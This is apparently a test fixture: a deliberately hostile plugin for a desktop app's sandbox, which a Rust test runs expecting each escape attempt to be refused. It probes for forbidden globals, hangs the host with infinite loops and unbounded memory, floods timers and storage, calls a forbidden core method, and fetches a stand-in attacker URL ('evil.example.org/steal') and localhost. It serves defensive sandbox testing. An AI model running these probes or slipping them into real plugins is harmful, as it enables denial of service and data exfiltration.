// A plugin written to break out, which apps/desktop/src/plugins/tests.rs runs in a real host and
// expects to fail at every turn. It uses no SDK, as a hostile plugin wouldn't: it hands its setup
// to the app the way definePlugin does, and pokes at whatever it can find.
globalThis.__zunaDefine?.(async (zuna) => {
  const report = (what) => zuna.ui.toast(JSON.stringify(what));
  switch (zuna.settings.get("attack")) {
    // A global that shouldn't be there: the core's, the system's, the web's.
    case "globals": {
      const names = ["__zunaHost", "__zunaCrypto", "__zunaDb", "__zunaSend", "__zunaSetTimer", "require", "process", "std", "os", "fetch", "XMLHttpRequest", "WebSocket", "Deno", "Bun", "importScripts"];
      report(Object.fromEntries(names.map((name) => [name, typeof globalThis[name]])));
      return;
    }
    // A loop that never ends, as it starts.
    case "loop":
      for (;;) {}
    // The same, later, in a timer.
    case "loop-later":
      setTimeout(() => {
        for (;;) {}
      }, 10);
      return;
    // Memory without end.
    case "memory": {
      const hoard = [];
      for (;;) hoard.push(new Array(1 << 16).fill(Math.random()));
    }
    // A view far larger than one may be.
    case "tree": {
      const leaves = Array.from({ length: 5000 }, (_, i) => ({ type: "text", props: {}, children: [{ type: "string", props: { text: String(i) }, children: [] }] }));
      zuna.ui.panel("big", { title: "Big", render: () => ({ type: "column", props: {}, children: leaves }) });
      return;
    }
    // A host it didn't name, and this machine.
    case "host":
      try {
        await zuna.net.fetch("https://evil.example.org/steal");
        report("reached");
      } catch (error) {
        report(`refused: ${error.message}`);
      }
      return;
    case "local":
      try {
        await zuna.net.fetch("https://127.0.0.1/");
        report("reached");
      } catch (error) {
        report(`refused: ${error.message}`);
      }
      return;
    // A method on the Never list.
    case "never":
      try {
        await zuna.core.call("server", "voiceKey", "channel");
        report("reached");
      } catch (error) {
        report(`refused: ${error.message}`);
      }
      return;
    // More timers than a plugin may keep.
    case "timers":
      try {
        for (let i = 0; i < 5000; i++) setTimeout(() => {}, 100000);
        report("kept");
      } catch (error) {
        report(`refused: ${error.message}`);
      }
      return;
    // More than a plugin may send at once.
    case "spam":
      try {
        await zuna.storage.set("hoard", "x".repeat(5 << 20));
        report("sent");
      } catch (error) {
        report(`refused: ${error.message}`);
      }
      return;
  }
});
